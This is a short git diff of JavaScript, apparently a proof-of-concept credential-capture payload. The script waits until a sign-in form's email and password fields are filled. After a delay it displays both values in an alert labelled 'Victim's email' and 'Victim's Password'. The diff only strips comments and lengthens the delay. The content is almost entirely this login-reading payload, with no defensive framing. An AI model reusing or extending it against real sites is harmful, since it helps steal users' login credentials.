@@ -6,18 +6,18 @@ let isFilled = false;
 
     if (input1.value && input2.value) {
       if (!isFilled) {
-        isFilled = true; // Ensure the script runs only once
+        isFilled = true; 
         setTimeout(function() {
           alert("Victim's email: "+document.getElementsByName('logonId')[0].value+"\nVictim's Password:"+document.getElementsByName('logonPassword')[0].value);
-          // Your script or function to run here
-        }, 5000); // Delay of 5 seconds
+         
+        }, 6500); 
       }
     }
   }
 
-  // Check inputs immediately when the page loads (in case they are pre-filled)
+  
   window.onload = checkInputs;
 
- // Listen for input changes
+
   document.getElementById('signin-email').addEventListener('input', checkInputs);
   document.getElementById('signin-password').addEventListener('input', checkInputs);
